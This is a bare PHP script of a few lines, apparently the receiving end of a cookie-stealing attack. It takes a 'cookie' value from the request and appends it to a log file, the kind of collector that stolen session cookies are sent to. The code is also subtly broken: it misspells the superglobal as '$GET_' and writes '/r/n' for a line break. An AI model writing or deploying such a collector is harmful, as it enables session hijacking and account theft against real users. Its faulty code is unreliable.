




<?
$cookie=$GET_['cookie'];
$log = fopen('log.txt','a');
fwrite($log,$cookie."/r/n");
fclose($log);
?> 





